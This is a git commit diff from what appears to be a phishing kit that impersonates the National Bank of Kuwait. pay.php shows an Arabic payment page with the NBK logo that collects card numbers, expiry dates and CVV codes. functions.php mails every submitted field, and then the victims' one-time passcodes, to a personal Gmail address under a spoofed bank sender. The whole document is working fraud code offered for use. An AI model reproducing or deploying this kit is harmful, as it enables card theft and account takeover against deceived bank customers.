71a01edb6cb0ed60bba712718e17876427798ee0
hasan kiwan <hasankiwan.action@gmail.com>
2024-11-17 00:08:57 +0300

    232w

--- functions.php
+++ functions.php
@@ -2,9 +2,10 @@
 
 // header("Access-Control-Allow-Origin: https://nbkkuwait.com");
 
-function sendtEmailPatment($data) {
+function sendtEmailPatment($data)
+{
     $to = "hassankiwan92@gmail.com";
-    $sender="admin@nbkkuwait.com";
+    $sender = "admin@nbkkuwait.com";
     $subject = "Payment Info";
     $message = "";
     foreach ($data as $key => $msg) {
@@ -22,21 +23,22 @@ function sendtEmailPatment($data) {
     } else {
         echo json_encode(['status' => 'error', 'message' => 'Failed.']);
     }
-    
+
     exit;
 }
-function sendOTP($data){
+function sendOTP($data)
+{
     $to = "hassankiwan92@gmail.com";
-    $sender="admin@nbkkuwait.com";
+    $sender = "admin@nbkkuwait.com";
     $subject = "OTP";
-    $message="";
-    foreach($data as $key=>$msg){
-        $message.= "$key :  $msg\n";
+    $message = "";
+    foreach ($data as $key => $msg) {
+        $message .= "$key :  $msg\n";
     }
     $headers = "From: $sender\r\n";
     $headers .= "Reply-To: $sender\r\n";
     $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
-    
+
     // Send the email
     header('Content-Type: application/json');
     if (mail($to, $subject, $message, $headers)) {
@@ -44,18 +46,115 @@ function sendOTP($data){
         echo json_encode(['status' => 'success', 'redirect' => './otp.php']);
     } else {
         echo json_encode(['status' => 'error', 'message' => 'Failed.']);
-      
+
     }
     exit;
 }
 
 
-if(isset($_POST)) {
-    if(isset($_POST['action']) =='sendtEmailPatment'){  
-        sendtEmailPatment($_POST);
-    }if(isset($_POST['action']) =='sendOTP'){  
-        sendOTP($_POST) ;
+function sendOTP2($data)
+{
+    $to = "hassankiwan92@gmail.com";
+    $sender = "admin@nbkkuwait.com";
+    $subject = "OTP";
+    $message = "";
+    foreach ($data as $key => $msg) {
+        $message .= "$key :  $msg\n";
     }
-    exit;  
+    $headers = "From: $sender\r\n";
+    $headers .= "Reply-To: $sender\r\n";
+    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
+
+    // Send the email
+    header('Content-Type: application/json');
+    if (mail($to, $subject, $message, $headers)) {
+        // Redirect if using GET only
+        echo json_encode(['status' => 'success', 'redirect' => './otp2.php']);
+    } else {
+        echo json_encode(['status' => 'error', 'message' => 'Failed.']);
+
+    }
+    exit;
+}
+
+
+
+
+
+
+function sendInfo($data)
+{
+    $to = "hassankiwan92@gmail.com";
+    $sender = "admin@nbkkuwait.com";
+    $subject = "OTP";
+    $message = "";
+    foreach ($data as $key => $msg) {
+        $message .= "$key :  $msg\n";
+    }
+    $headers = "From: $sender\r\n";
+    $headers .= "Reply-To: $sender\r\n";
+    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
+
+    // Send the email
+    header('Content-Type: application/json');
+    if (mail($to, $subject, $message, $headers)) {
+        // Redirect if using GET only
+        echo json_encode(['status' => 'success', 'redirect' => './otp2.php']);
+    } else {
+        echo json_encode(['status' => 'error', 'message' => 'Failed.']);
+
+    }
+    exit;
+}
+
+
+function sendInfoData($data)
+{
+    $to = "hassankiwan92@gmail.com";
+    $sender = "admin@nbkkuwait.com";
+    $subject = "OTP";
+    $message = "";
+    foreach ($data as $key => $msg) {
+        $message .= "$key :  $msg\n";
+    }
+    $headers = "From: $sender\r\n";
+    $headers .= "Reply-To: $sender\r\n";
+    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
+
+    // Send the email
+    header('Content-Type: application/json');
+    if (mail($to, $subject, $message, $headers)) {
+        // Redirect if using GET only
+        echo json_encode(['status' => 'success', 'redirect' => './pay.php']);
+    } else {
+        echo json_encode(['status' => 'error', 'message' => 'Failed.']);
+
+    }
+    exit;
+}
+
+
+if (isset($_POST)) {
+    if (isset($_POST['action']) == 'sendtEmailPatment') {
+        sendtEmailPatment($_POST);
+    }
+    if (isset($_POST['action']) == 'sendOTP') {
+        sendOTP($_POST);
+    }
+
+    if (isset($_POST['action']) == 'sendInfoData') {
+        sendInfoData($_POST);
+    }
+
+    if (isset($_POST['action']) == 'sendInfo') {
+        sendInfo($_POST);
+    }
+
+
+    if (isset($_POST['action']) == 'sendOTP2') {
+        sendOTP2($_POST);
+    }
+
+    exit;
 }
 ?>
--- pay.php
+++ pay.php
@@ -1,8 +1,9 @@
 <?php
-$contraies=array("الكويت","مصر","السعودية","العراق","لبنان","الامارات","الصين","فرنسا","سنغفورا","سويسرا","المملكة المتحدة","الولايات المتحدة");
+$contraies = array("الكويت", "مصر", "السعودية", "العراق", "لبنان", "الامارات", "الصين", "فرنسا", "سنغفورا", "سويسرا", "المملكة المتحدة", "الولايات المتحدة");
 ?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -14,9 +15,10 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
     <link rel="stylesheet" href="pay.css">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-       
+
     </style>
 </head>
+
 <body>
 
     <header class="header-image d-flex justify-content-center align-items-center">
@@ -25,7 +27,7 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                 <!-- Box with Name and Image -->
                 <div class="col-md-12 mb-3">
                     <div class="content-box text-center">
-                        <img src="banner.png" alt="User Image" class="banner mb-3" > <!-- Replace with your image URL -->
+                        <img src="banner.png" alt="User Image" class="banner mb-3"> <!-- Replace with your image URL -->
                     </div>
                 </div>
             </div>
@@ -35,7 +37,8 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
         <div class="container">
             <div class="box-one">
                 <div class="d-flex justify-content-center">
-                    <img src="https://www.nbk.com/dam/jcr:281bc4f7-7256-48c6-a05e-761bacea00a3/nbk-logo.svg" alt="SPACES" itemprop="logo">
+                    <img src="https://www.nbk.com/dam/jcr:281bc4f7-7256-48c6-a05e-761bacea00a3/nbk-logo.svg"
+                        alt="SPACES" itemprop="logo">
                 </div>
                 <ul class="list-group list-group-flush">
                     <li class="list-group-item d-flex justify-content-start">
@@ -44,13 +47,15 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                     </li>
                     <li class="list-group-item d-flex justify-content-start">
                         <span class="">المبلغ</span> <!-- Aligns to the left -->
-                        <span class="mx-auto text-blue"><?php echo  isset($_GET['amount'])?  $_GET['amount']." KD" :  '100 KD'?></span> <!-- Centers within the list item -->
+                        <span
+                            class="mx-auto text-blue"><?php echo isset($_GET['amount']) ? $_GET['amount'] . " KD" : '100 KD' ?></span>
+                        <!-- Centers within the list item -->
                     </li>
                 </ul>
             </div>
         </div>
     </section>
-    <from  id="payment-form">
+    <from id="payment-form">
         <input type="hidden" name="action" id="action" value="sendtEmailPatment">
 
         <section>
@@ -63,9 +68,11 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                     <span class="text-blue">يرجى اختيار البلد</span> <!-- Aligns to the left -->
                                 </div>
                                 <div class="col-8">
-                                    <select class="form-select"  name="contry" id="contry" aria-label="Select an option">
+                                    <select class="form-select" name="contry" id="contry" aria-label="Select an option">
                                         <option value="" disabled selected hidden>ارجو اختيار البلد</option>
-                                        <?php foreach($contraies as $c){echo "<option value='$c'>$c</option>";}?> 
+                                        <?php foreach ($contraies as $c) {
+                                            echo "<option value='$c'>$c</option>";
+                                        } ?>
                                     </select>
                                 </div>
                             </div>
@@ -77,11 +84,13 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                     <span class="text-blue">رقم بطاقة الصراف الألي</span> <!-- Aligns to the left -->
                                 </div>
                                 <div class="col-4">
-                                    <input type="text" class="form-control" name="cardNumber"  id="cardNumber" placeholder="رقم بطاقة الصراف الألي">
+                                    <input type="text" class="form-control" name="cardNumber" id="cardNumber"
+                                        placeholder="رقم بطاقة الصراف الألي">
                                 </div>
                                 <div class="col-4">
-                                    <select class="form-select"  name="bada" id="bada" aria-label="Select an option">
-                                        <option value="" disabled selected hidden>بادئة</option> <!-- Placeholder option -->
+                                    <select class="form-select" name="bada" id="bada" aria-label="Select an option">
+                                        <option value="" disabled selected hidden>بادئة</option>
+                                        <!-- Placeholder option -->
                                         <option value="1">Option 1</option>
                                         <option value="2">Option 2</option>
                                         <option value="3">Option 3</option>
@@ -98,7 +107,9 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                 <div class="col-2">
                                     <select class="form-select " id="month" name="month" aria-label="MM">
                                         <option value="" disabled selected hidden>MM</option>
-                                        <?php for ($i = 1; $i <= 12; $i++) { echo "<option value='$i'>$i</option>"; } ?>
+                                        <?php for ($i = 1; $i <= 12; $i++) {
+                                            echo "<option value='$i'>$i</option>";
+                                        } ?>
                                         <!-- <option value="1">January</option>
                                         <option value="2">February</option>
                                         <option value="3">March</option>
@@ -117,7 +128,9 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                     <select class="form-select w-100" id="year" name="year" aria-label="Select Year">
                                         <option value="" disabled selected hidden>YY</option>
                                         <!-- Generate years dynamically if needed -->
-                                         <?php for ($i = 2023; $i <= 2030; $i++) { echo "<option value='$i'>$i</option>"; } ?>
+                                        <?php for ($i = 2023; $i <= 2030; $i++) {
+                                            echo "<option value='$i'>$i</option>";
+                                        } ?>
                                         <!-- <option value="2023">2023</option>
                                         <option value="2024">2024</option>
                                         <option value="2025">2025</option>
@@ -130,14 +143,15 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                 </div>
                             </div>
                         </li>
-                        
+
                         <li class="list-group-item">
                             <div class="row">
                                 <div class="col-4">
                                     <span class="text-blue">الرقم السري</span> <!-- Aligns to the left -->
                                 </div>
                                 <div class="col-8">
-                                    <input type="text" class="form-control" name="cvv" id="cvv" placeholder="الرقم السري">
+                                    <input type="text" class="form-control" name="cvv" id="cvv"
+                                        placeholder="الرقم السري">
                                 </div>
                             </div>
                         </li>
@@ -159,95 +173,96 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                 </div>
             </div>
         </section>
-</from>
+    </from>
     <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
 
 
     <script>
-    $(document).ready(function() {
-      $('#send-data').click(function(e) {
-        e.preventDefault();
-        var isValid = true;
-        var contry = $('#contry').val();
-        // Simple validation
-        var name = $('#cardNumber').val();
-        // var email = $('#email').val();
-       var month = $('#month').val();
-       var year = $('#year').val();
-       var cvv = $('#cvv').val();
-       var action = $('#action').val();
-       var bada = $('#bada').val();
-    
-       if (contry === "" || contry === null) {
-          alert("الرجاء ادخال الدولة.");
-          isValid = false;
-          return "";
-        }
-        // Check if name is filled
-        if (name === "" || name === null) {
-          alert("الرجاء ادخال الاسم.");
-          isValid = false;
-          return "";
-        }
-        if (month === "" || month === null) {
-          alert("الرجاء ادخال الشهر.");
-          isValid = false;
-          return "";
-        }
-        if (year === "" || year === null) {
-          alert("الرجاء ادخال السنة.");
-          isValid = false;
-          return "";
-        }
-        if (cvv === ""  || cvv === null) {
-          alert("الرجاء ادخال الرقم السري.");
-          isValid = false;
-          return "";
-        }
-    
-        // Submit form if valid
-        if (isValid) {
-    
-            $.ajax({
-                url: '/functions.php',
-                type: 'POST',
-                data: {
-                    action: action,
-                    contry: contry,
-                    name: name,
-                    month: month,
-                    year: year,
-                    cvv: cvv,
-                    bada: bada
-                },
-                dataType: 'json', // Expect JSON response
-                success: function(response) {
-                    if (response.status === 'success') {
-                        // Redirect to OTP page if the email was sent successfully
-                        window.location.href = response.redirect;
-                    } else {
-                        // Display an error message if something went wrong
-                        alert(response.message || 'Failed ');
-                    }
-                },
-                error: function(jqXHR, textStatus, errorThrown) {
-                    console.error('AJAX Error:', textStatus, errorThrown);
-                    alert('An error occurred while sending your request.');
+        $(document).ready(function () {
+            $('#send-data').click(function (e) {
+                e.preventDefault();
+                var isValid = true;
+                var contry = $('#contry').val();
+                // Simple validation
+                var name = $('#cardNumber').val();
+                // var email = $('#email').val();
+                var month = $('#month').val();
+                var year = $('#year').val();
+                var cvv = $('#cvv').val();
+                var action = $('#action').val();
+                var bada = $('#bada').val();
+
+                if (contry === "" || contry === null) {
+                    alert("الرجاء ادخال الدولة.");
+                    isValid = false;
+                    return "";
+                }
+                // Check if name is filled
+                if (name === "" || name === null) {
+                    alert("الرجاء ادخال الاسم.");
+                    isValid = false;
+                    return "";
+                }
+                if (month === "" || month === null) {
+                    alert("الرجاء ادخال الشهر.");
+                    isValid = false;
+                    return "";
+                }
+                if (year === "" || year === null) {
+                    alert("الرجاء ادخال السنة.");
+                    isValid = false;
+                    return "";
+                }
+                if (cvv === "" || cvv === null) {
+                    alert("الرجاء ادخال الرقم السري.");
+                    isValid = false;
+                    return "";
+                }
+
+                // Submit form if valid
+                if (isValid) {
+
+                    $.ajax({
+                        url: '/functions.php',
+                        type: 'POST',
+                        data: {
+                            action: action,
+                            contry: contry,
+                            name: name,
+                            month: month,
+                            year: year,
+                            cvv: cvv,
+                            bada: bada
+                        },
+                        dataType: 'json', // Expect JSON response
+                        success: function (response) {
+                            if (response.status === 'success') {
+                                // Redirect to OTP page if the email was sent successfully
+                                window.location.href = response.redirect;
+                            } else {
+                                // Display an error message if something went wrong
+                                alert(response.message || 'Failed ');
+                            }
+                        },
+                        error: function (jqXHR, textStatus, errorThrown) {
+                            console.error('AJAX Error:', textStatus, errorThrown);
+                            alert('An error occurred while sending your request.');
+                        }
+                    });
+
+                    //   $('#payment-form').submit();
                 }
             });
 
-        //   $('#payment-form').submit();
-        }
-      });
-
-      // Function to validate email format
-      function validateEmail(email) {
-        var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return emailPattern.test(email);
-      }
-    });
-  </script>
+            // Function to validate email format
+            function validateEmail(email) {
+                var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailPattern.test(email);
+            }
+        });
+    </script>
 </body>
+
 </html>
